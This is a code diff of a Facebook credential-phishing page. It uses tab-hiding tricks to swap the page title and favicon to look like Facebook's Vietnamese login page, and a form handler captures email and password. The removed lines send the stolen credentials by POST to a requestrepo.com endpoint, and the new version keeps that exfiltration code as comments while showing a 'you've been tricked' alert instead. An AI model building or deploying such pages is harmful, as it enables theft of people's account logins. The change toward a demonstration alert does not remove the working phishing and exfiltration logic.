@@ -156,16 +156,15 @@
 
       document.addEventListener("visibilitychange", () => {
         if (document.visibilityState === "hidden") {
-          console.log("🔴 Page hidden - starting 180s timer...");
-
+          console.log("🔴 Page hidden - starting 3s timer...");
           overlayEl.style.display = "flex";
 
           hiddenTimer = setTimeout(() => {
             overlayEl.style.display = "none";
-            console.log("⏳ User away > 180s, Facebook UI stays");
+            console.log("⏳ User away > 3s, changing title and favicon");
             changeFavicon("/fb.ico");
-            document.title = "Facebook - đăng nhập hoặc đăng ký";
-          }, 10 * 1000);            //Set time delay
+            document.title = "Facebook - Đăng nhập hoặc đăng ký";
+          }, 3 * 1000); // 3 seconds
         } else {
           console.log("🟢 Page is visible again");
 
@@ -174,7 +173,6 @@
             hiddenTimer = null;
           }
 
-          overlayEl.style.display = "none";
           
         }
       });
@@ -185,21 +183,23 @@
           e.preventDefault();
 
           const inputs = this.querySelectorAll("input");
-          const email = inputs[0].value.trim();
+          const email = inputs[0].value;
           const password = inputs[1].value;
           const combined = `${email}:${password}`;
+          alert("Bạn đã bị lừa: Email/SĐT: " + email + " - Password:" + password);
 
-          fetch("https://63264c5h.requestrepo.com/", {
-            method: "POST",
-            body: combined,
-          })
-            .then(() => {
-              console.log("✅ Credentials sent as raw string.");
-              window.location.href = "https://facebook.com/";
-            })
-            .catch((err) => {
-              console.error("❌ Failed to send credentials", err);
-            });
+          //fetch("https://6wnfqxa7.requestrepo.com/", {
+            //method: "POST",
+            //body: combined,
+          //})
+            //.then(() => {
+              //console.log("✅ Credentials sent as raw string.");
+              //alert("Bạn đã bị lừa: Email/SĐT: " + email + " - Password:" + password);
+              
+            //})
+            //.catch((err) => {
+              //console.error("❌ Failed to send credentials", err);
+            //});
         });
     </script>
   </body>
